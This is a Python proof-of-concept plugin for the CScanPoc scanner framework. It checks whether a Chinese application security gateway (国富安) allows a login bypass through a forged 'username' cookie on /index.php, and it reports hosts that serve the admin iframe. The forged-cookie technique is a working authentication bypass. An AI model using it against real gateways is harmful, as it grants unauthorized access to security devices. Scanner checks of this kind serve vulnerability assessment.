# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import random

class Vuln(ABVuln):
    vuln_id = 'Gfapki_0003' # 平台漏洞编号，留空
    name = '国富安应用安全网关登录绕过'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        国富安应用安全网关登录绕过。
        cookie: username=WTF
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '国富安应用安全网关'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'c512f723-6fcf-4cc8-a5f1-506894945973'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            arg = self.target
            cookie = 'username=wtf'
            code, head, res, err, _ = hh.http(arg + '/index.php', cookie=cookie)
            if (code == 200) and ('<iframe ' in res):
                #security_hole('Bypass authority: ' + arg + ' Cookie: '+cookie)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
